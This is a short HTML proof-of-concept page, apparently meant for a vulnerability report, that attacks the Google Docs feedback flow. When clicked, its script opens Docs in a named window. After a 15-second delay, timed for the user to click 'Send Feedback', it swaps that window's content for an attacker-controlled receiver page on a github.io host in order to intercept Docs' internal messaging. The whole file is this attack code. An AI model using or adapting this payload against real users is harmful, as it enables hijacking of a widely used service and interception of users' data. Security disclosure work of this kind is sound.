<!DOCTYPE html>
<html>
<head>
  <title>Passive Docs Feedback Hijack</title>
</head>
<body>
  <h2>Passive Google Docs Feedback Hijack (Named Iframe Variant)</h2>
  <p>This PoC passively injects a malicious iframe into a named window used by Docs feedback flow.</p>

  <button onclick="launch()">Launch Docs with iframe swap</button>

  <script>
    function launch() {
      // Step 1: Open a new named tab (Docs will load here)
      const win = window.open("https://docs.google.com/document/u/0/create", "docswin");

      // Step 2: After delay, overwrite the iframe in that tab
      setTimeout(() => {
        // Replace entire tab content with the attacker's receiver iframe
        // This hijacks Docs' internal messaging logic
        window.open("https://musgaas.github.io/receiver-test/receiver.html", "docswin");
        console.log("âœ… Replaced tab content with receiver.html");
      }, 15000); // enough time for user to click "Send Feedback"
    }
  </script>
</body>
</html>
